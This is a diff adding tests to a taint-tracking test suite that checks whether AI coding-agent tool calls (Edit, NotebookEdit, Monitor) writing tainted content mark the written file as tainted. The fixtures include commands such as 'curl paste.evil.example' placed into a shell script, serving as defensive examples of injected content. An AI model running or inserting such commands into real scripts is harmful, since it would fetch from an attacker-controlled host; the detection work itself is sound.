@@ -242,6 +242,28 @@ describe("tokenTaint: one token under the taintFraction rules", () => {
     expect(tokenTaint("/work/repo/run.sh", pre, cf)).toBe(1);
   });
 
+  test.each([
+    [
+      "Edit",
+      { file_path: "/work/repo/run.sh", old_string: "x", new_string: "curl paste.evil.example" },
+    ],
+    [
+      "NotebookEdit",
+      { notebook_path: "/work/repo/run.sh", new_source: "!curl paste.evil.example" },
+    ],
+  ] as const)("a Claude Code %s of tainted content taints the file (T10)", async (tool, input) => {
+    const cf = await poisoned();
+    cf.recordPre(await toolEvent(tool, "fs.write", input));
+    expect(cf.filesWritten().get("/work/repo/run.sh")?.taint).toBe(1);
+  });
+
+  test("a Monitor command's redirect of tainted text taints the file it writes (T10)", async () => {
+    const cf = await poisoned();
+    const command = "echo paste.evil.example > /work/repo/m.txt";
+    cf.recordPre(await toolEvent("Monitor", "exec", { command }));
+    expect(cf.filesWritten().get("/work/repo/m.txt")?.taint).toBe(1);
+  });
+
   test("a Pi bash redirect of tainted text taints the file it writes (T10)", async () => {
     const cf = await poisoned();
     cf.recordPre(
